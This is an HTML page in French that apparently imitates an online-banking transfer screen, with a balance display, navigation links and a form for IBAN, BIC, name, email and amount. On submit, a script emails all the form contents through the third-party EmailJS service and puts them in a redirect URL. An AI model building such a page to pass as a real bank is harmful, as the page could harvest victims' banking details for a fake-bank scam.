<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Effectuer un Virement Bancaire</title>
  <link rel="stylesheet" href="styles.css">
  <script src="https://cdn.emailjs.com/sdk/3.11.0/email.min.js"></script>
  <script type="module" src="shared.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f7fa;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #003366;
      color: white;
      padding: 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .user-info {
      font-size: 0.9em;
    }
    nav {
      background-color: #e0e6ed;
      padding: 10px;
      display: flex;
      gap: 20px;
      font-weight: bold;
    }
    nav a {
      text-decoration: none;
      color: #003366;
    }
    main {
      display: flex;
      padding: 20px;
    }
    .left-panel {
      flex: 3;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .right-panel {
      flex: 1;
      margin-left: 20px;
    }
    .right-panel button {
      display: block;
      width: 100%;
      margin-bottom: 10px;
      padding: 10px;
      background-color: #003366;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    form label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    form input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    form button {
      margin-top: 20px;
      padding: 10px;
      background-color: #003366;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <header>
    <div class="user-info">
      <span id="user-name">Bienvenue</span><br>
      <span id="last-conn">Dernière connexion : </span>
    </div>
    <div>
      <strong>Solde : <span id="user-solde">...</span></strong>
      <a href="#" class="status" style="color:white; margin-left:20px;">Se déconnecter</a>
    </div>
  </header>

  <nav>
    <a href="dashboard.html">VOS COMPTES ET PRODUITS</a>
    <a href="historique.html">OPÉRATIONS COURANTES</a>
    <a href="#">S'INFORMER OU SOUSCRIRE</a>
  </nav>

  <main>
    <div class="left-panel">
      <h2>Effectuer un Virement Bancaire</h2>
      <p>Veuillez remplir le formulaire ci-dessous pour effectuer votre transaction.</p>

      <form id="virement-form">
        <label>Montant</label>
        <input type="number" name="montant" required>

        <label>Motif</label>
        <input type="text" name="motif" required>

        <label>IBAN</label>
        <input type="text" name="iban" required>

        <label>BIC</label>
        <input type="text" name="bic" required>

        <label>Domiciliation</label>
        <input type="text" name="domiciliation" required>

        <label>Nom et Prénom</label>
        <input type="text" name="nomPrenom" required>

        <label>Email</label>
        <input type="email" name="user_email" required>

        <label>Date</label>
        <input type="date" name="date" required>

        <button type="submit">Valider le virement</button>
      </form>
    </div>

    <div class="right-panel">
      <button onclick="location.href='dashboard.html'">SYNTHÈSE DES COMPTES</button>
      <button onclick="location.href='historique.html'">HISTORIQUE DES OPÉRATIONS</button>
      <button onclick="location.href='rib.html'">IMPRIMER UN RIB</button>
      <button onclick="location.href='virement.html'">FAIRE UN VIREMENT</button>
      <button onclick="alert('Espace sécurisé')">VOTRE ESPACE SÉCURISÉ</button>
    </div>
  </main>

  <script type="module">
    import { checkAuth } from './shared.js';

    document.addEventListener('DOMContentLoaded', async () => {
      const currentUser = await checkAuth();
      if (!currentUser) return;

      document.getElementById('user-name').textContent = `Bienvenue ${currentUser.name}`;
      document.getElementById('last-conn').textContent = `Dernière connexion le ${currentUser.lastConnection}`;
      document.getElementById('user-solde').textContent = `${currentUser.solde.toFixed(2)} €`;

      emailjs.init("J7FXx-CCy4kJqRPii"); // remplace par ta clé EmailJS

      document.getElementById('virement-form').addEventListener('submit', async function(e) {
        e.preventDefault();

        await emailjs.sendForm('service_jk2zlpu', 'template_2cscyst', this);

        const formData = new FormData(this);
        const params = new URLSearchParams();
        for (const [key, value] of formData.entries()) {
          params.append(key, value);
        }

        window.location.href = `confirmation.html?${params.toString()}`;
      });
    });
  </script>
</body>
</html>
